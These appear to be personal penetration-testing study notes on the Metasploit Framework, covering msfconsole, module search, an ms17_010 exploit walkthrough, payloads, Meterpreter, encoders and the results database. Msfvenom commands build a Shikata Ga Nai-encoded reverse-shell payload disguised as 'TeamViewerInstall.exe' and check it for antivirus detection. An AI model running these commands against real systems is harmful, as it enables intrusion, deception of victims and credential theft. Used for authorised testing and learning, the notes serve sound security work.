# Introduction to Metasploit
The Metasploit Framework includes a suite of tools that you can use to test security vulnerabilities, enumerate networks, execute attacks, and evade detection. 
Metasploit is not a jack of all trades but a swiss army knife with just enough tools to get us through the most common unpatched vulnerabilities.

The Metasploit Pro version is different from the Metasploit Framework one with some additional features:

Task Chains, Social Engineering, Vulnerability Validations, GUI, Quick Start Wizards, Nexpose Integration.

## Archietecture
__Data, Documentation, Lib__ These are the base files for the Framework. The Data and Lib are the functioning parts of the msfconsole interface, while the Documentation folder contains all the technical details about the project.
__Modules__ The Modules detailed above are split into separate categories in this folder. 
```
ls /usr/share/metasploit-framework/modules
```
__Plugins__
Plugins offer the pentester more flexibility when using the msfconsole since they can easily be manually or automatically loaded as needed to provide extra functionality and automation during our assessment.
```
ls /usr/share/metasploit-framework/plugins/
```
__Scripts__ Meterpreter functionality and other useful scripts.
```
ls /usr/share/metasploit-framework/scripts/
```
__Tools__ Command-line utilities that can be called directly from the msfconsole menu.
```
ls /usr/share/metasploit-framework/tools/
```
# Introddction to MSFconsole
Type msfconsole in the terminal of our choice. Many security-oriented distributions such as Parrot Security and Kali Linux come with msfconsole preinstalled.
```
msfconsole -q
```
__Update MSFconsole__
```
sudo apt update && sudo apt install metasploit-framework
```
- **Enumeration** is the initial phase before exploitation to gather details about the target.
- Identify public-facing services (e.g., HTTP, FTP, SQL) on the target.
- Perform a scan on the target’s IP to detect services and their versions.
- **Versions** of services are critical in determining vulnerabilities.
- Unpatched or outdated services are often the entry points for exploitation.

- The **MSF engagement structure** has five main categories:
  - Enumeration
  - Preparation
  - Exploitation
  - Privilege Escalation
  - Post-Exploitation
- Each category includes subcategories like Service Validation and Vulnerability Research.
- Understanding this structure helps in selecting appropriate MSF features for specific tasks.
![image](https://github.com/user-attachments/assets/c3ee6a7c-4b2a-43f4-b604-aa43b30a5c11)

# Modules
Metasploit modules are prepared scripts with a specific purpose and corresponding functions that have already been developed and tested in the wild.

**Index No.**
The No. tag will be displayed to select the exploit we want afterward during our searches. 
**Type**
The Type tag is the first level of segregation between the Metasploit modules.
| Type       | Description                                                                                 |
|------------|---------------------------------------------------------------------------------------------|
| Auxiliary  | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality. |
| Encoders   | Ensure that payloads are intact to their destination.                                        |
| Exploits   | Defined as modules that exploit a vulnerability that will allow for the payload delivery.   |
| NOPs       | (No Operation code) Keep the payload sizes consistent across exploit attempts.              |
| Payloads   | Code runs remotely and calls back to the attacker machine to establish a connection (or shell). |
| Plugins    | Additional scripts can be integrated within an assessment with msfconsole and coexist.    |
| Post       | Wide array of modules to gather information, pivot deeper, etc.                             |

**OS**
The OS tag specifies which operating system and architecture the module was created for.
**Service**
The Service tag refers to the vulnerable service that is running on the target machine. For some modules, such as the auxiliary or post ones, this tag can refer to a more general activity such as gather, referring to the gathering of credentials.
**Name**
Finally, the Name tag explains the actual action that can be performed using this module created for a specific purpose.

## Searching for Modules
all search functions
```
help search
```
Search Exploit 
```
search eternalromance
```
Search better using -> **year (cve:<year>)**, the **platform Windows (platform:<os>)**, the **type of module** we want to find **(type:<auxiliary/exploit/post>)**, the **reliability** rank **(rank:<rank>)**, and the **search name (<pattern>)**.

```
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```
## Module Selection
```
search ms17_010
```
```
use no.1
```
after that see options

```
options
```
use the command **info** after selecting the module if we want to know something more about the module. 
```
info
```
set the options that are required 
```
set RHOSTS 10.10.10.40
```
Set global **setg**, which specifies options selected by us as permanent until the program is restarted.
```
setg RHOSTS 10.10.10.40
```
**Exploit Execution**
```
 run
```
# Targets
Targets are unique operating system identifiers taken from the versions of those specific operating systems which adapt the selected exploit module to run on that particular version of the operating system.

1. **Targets**:  
   - Unique to specific OS versions, service packs, or language versions.  
   - The chosen exploit module is adapted to match the identified target for a successful attack.

2. **`show targets` Command**:  
   - Inside a selected exploit module: Lists all vulnerable targets for that specific module.  
   - Outside any module: Prompts that an exploit module needs to be selected first.

3. **Exploit Module Information**:  
   - **Automatic Targeting**: Metasploit automatically detects the version of the target and adapts the exploit.  
   - **Manual Targeting**: Use `set target <index>` to manually choose the target from the available list based on your knowledge of the target's OS version and service pack.

4. **Target Types**:  
   - Target details may vary based on service packs, OS versions, or language versions.  
   - Metasploit adjusts parameters like the **return address**, which can be affected by differences in language packs or hooks.  
   - Common return addresses used in exploits include `jmp esp` or `pop/pop/ret` sequences.

5. **Return Address**:  
   - A critical part of the exploit that directs program flow.  
   - Language packs, software versions, or system hooks can change the location of the return address.  
   - Use **msfpescan** to find a suitable return address when crafting or adapting an exploit.

# Payloads

A Payload in Metasploit refers to a module that aids the exploit module in (typically) returning a shell to the attacker. The payloads are sent together with the exploit itself to bypass standard functioning procedures of the vulnerable service (exploits job) and then run on the target OS to typically return a reverse connection to the attacker and establish a foothold (payload's job).

**Singles** are self-contained payloads that include both the exploit and the full shellcode necessary for execution. They are designed to be more stable and provide immediate results upon execution, although their larger size may limit compatibility with certain exploits. Examples of Single payloads include tasks like adding a user to the target system or initiating a process.

**Stagers** work in conjunction with Stages to establish a connection between the attacker and the victim. They are small and reliable, waiting on the attacker’s machine to connect after the Stage completes its run on the target. Metasploit intelligently selects the best available stager, reverting to less preferred options if necessary. There are two types of stagers: NX and NO-NX. NX stagers are typically larger due to the use of VirtualAlloc for memory allocation and are the default choice for Windows 7 compatibility, addressing reliability issues with NX CPUs and DEP.

**Stages** are payload components downloaded by Stagers, offering advanced features such as Meterpreter and VNC Injection without size constraints. They utilize middle stagers to improve handling of larger payloads, addressing the limitations of single recv() calls that may fail. The Stager first receives the middle stager, which then facilitates the full payload download.

## Staged Payloads

- **Definition**: Staged payloads modularize the exploitation process, separating functions into distinct code blocks that chain together to gain remote access to a target machine.
- **Objectives**: Besides shell access, they aim to be compact and stealthy to evade Antivirus (AV) and Intrusion Prevention System (IPS) detection.

### Stage0

- **Purpose**: The initial shellcode sent to the target to establish a reverse connection back to the attacker’s machine.
- **Common Types**: Seen in names like `reverse_tcp`, `reverse_https`, etc.
- **Communication**: Designed to read a larger subsequent payload (Stage1 mostly to gain shell access) into memory after a stable channel is established. 

### Meterpreter Payload

- **Characteristics**: A multifaceted payload using DLL injection, ensuring a stable and hard-to-detect connection. It resides in memory, leaving no traces on the hard drive.
- **Functionality**: Offers commands for keystroke capture, password collection, and more. It supports dynamic loading of scripts and plugins.

### Searching for Payloads

- **Finding Payloads**: Use `show payloads` in `msfconsole` to see available options.
- **Grep for Filtering**: To speed up searches, use `grep` with keywords, e.g., `grep meterpreter show payloads`.

### Selecting Payloads

- **Process**: To set a payload, first select an exploit module and use `set payload <no.>` with the corresponding index number.

## MSF Payload and Exploit Configuration
Detecting Target OS:

Running show payloads in the exploit module detects that the target is Windows, showing relevant payloads.
Key Parameters for Configuration:

Exploit Module:
RHOSTS: IP of the target machine.
RPORT: Check it's set to port 445 (SMB).
Payload Module:
LHOST: Attacker's IP address.
LPORT: Check it's not in use.
Check LHOST IP:

Use ifconfig in msfconsole.

Using Meterpreter:
Replace **whoami** with **getuid** to check user (meterpreter uses linux commands)

Meterpreter Commands:
Core Commands: Background session, load extensions, exit session.
File System Commands: ls, cd, upload, download.
Networking Commands: ifconfig, netstat, portfwd.
System Commands: ps, shell, shutdown.

Use help command to find out all possible commands of meterpreter.

To access shell use **shell** command.

**Channel 1** has been created, and we are automatically placed into the CLI for this machine. The channel here represents the connection between our device and the target host, which has been established in a reverse TCP connection (from the target host to us) using a Meterpreter Stager and Stage.
## Payload Types
![image](https://github.com/user-attachments/assets/593bb485-7e62-499b-99f4-205fee825ce5)

# Encoders
- **Encoders** help make payloads compatible with different architectures (e.g., x64, x86, sparc, ppc, mips) and assist in antivirus evasion.
- They remove bad characters from payloads and can encode payloads in different formats for AV evasion, though their effectiveness for AV evasion has diminished.

## Shikata Ga Nai (SGN)
- One of the most widely used encoders, known for its ability to evade detection, though it's no longer as undetectable as before.
- **SGN** means "It cannot be helped".

## Payload Encoding Evolution
- **Pre-2015**: Used **msfpayload** and **msfencode** to generate and encode payloads.
- **Post-2015**: Both tools were combined into **msfvenom** for payload generation and encoding.

## Example: SGN Encoding with msfvenom
Generates encoded payloads:
```
 msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

## AV Evasion and Iterations
Encoding payloads multiple times with SGN increases the size but doesn't fully evade modern antivirus detection.
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -f exe -i 10 -o ./TeamViewerInstall.exe
```

Metasploit offers a tool called msf-virustotal that we can use with an API key to analyze our payloads. Register for free and get api key.
```
msf-virustotal -k <API key> -f TeamViewerInstall.exe
```

# Databases
**Databases** in msfconsole are used to keep track of your results. It is no mystery that during even more complex machine assessments, much less entire networks, things can get a little fuzzy and complicated due to the sheer amount of search results, entry points, detected issues, discovered credentials, etc.

## Setting up the Database
**PostgreSQL Status**
```
sudo service postgresql status
```
Start PostgreSQL
```
sudo systemctl start postgresql
```
**MSF - Initiate a Database**
```
sudo msfdb init
```
Sometimes an error can occur if Metasploit is not up to date. 

check msfdb status
```
 sudo msfdb status
```

**MSF - Connect to the Initiated Database**
```
sudo msfdb run
```
If, however, we already have the database configured and are not able to change the password to the MSF username, proceed with these commands:
```
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
```

The msfconsole also offers integrated help for the database. 

```
help database
```
## Using the Database
With the help of the database, we can manage many different categories and hosts that we have analyzed. Alternatively, the information about them that we have interacted with using Metasploit. These databases can be exported and imported. 
### Workspaces

We can think of Workspaces the same way we would think of folders in a project. We can segregate the different scan results, hosts, and extracted information by IP, subnet, network, or domain.

View current workspace use workspace command.
```
msf6 > workspace
```
Add Workspace
```
workspace -a Target_1
```
Delete Workspace 
```
workspace -d Target_1
```
Change workspace
```
workspace Target_1
```
we can use the **workspace -h command **for the help menu related to Workspaces.

## Importing Scan Results
we want to import a Nmap scan of a host into our Database's Workspace to understand the target better. We can use the db_import command for this.(make sure file is in .xml it is preferred)


```
db_import Target.xml
```

## Using Nmap Inside MSFconsole
```
db_nmap -sV -sS 10.10.10.8
```
![image](https://github.com/user-attachments/assets/40a4ceb3-6899-4adb-9998-23cd83b71163)


### Data Backup
make sure to back up our data if anything happens with the PostgreSQL service.

**db_export help command**
```
db_export -h
```

```
db_export -f xml backup.xml
```

### Hosts
The hosts command displays a database table automatically populated with the host addresses, hostnames, and other information we find about these during our scans and interactions.For example, suppose msfconsole is linked with scanner plugins that can perform service and OS detection.

**MSF - Stored Hosts**
```
hosts -h
```
### Services
The services command functions the same way as the previous one. It contains a table with descriptions and information on services discovered during scans or interactions. In the same way as the command above, the entries here are highly customizable.
```
services -h
```
### Credentials
The creds command allows you to visualize the credentials gathered during your interactions with the target host. (can add manually the creds)
```
creds -h
```
### Loot
The loot command works in conjunction with the command above to offer you an at-a-glance list of owned services and users. The loot, in this case, refers to hash dumps from different system types, namely hashes, passwd, shadow, and more.
```
loot -h
```
